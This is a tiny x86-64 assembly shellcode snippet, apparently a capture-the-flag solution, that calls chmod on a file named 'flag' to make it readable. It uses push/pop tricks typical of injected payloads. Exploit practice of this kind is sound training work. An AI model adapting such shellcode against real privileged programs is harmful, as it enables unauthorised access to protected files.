.global _start
_start:
.intel_syntax noprefix

# chmod("flag", 4);
push 90
pop rax
push 0x67616c66
push rsp
pop rdi
push 4
pop rsi
syscall
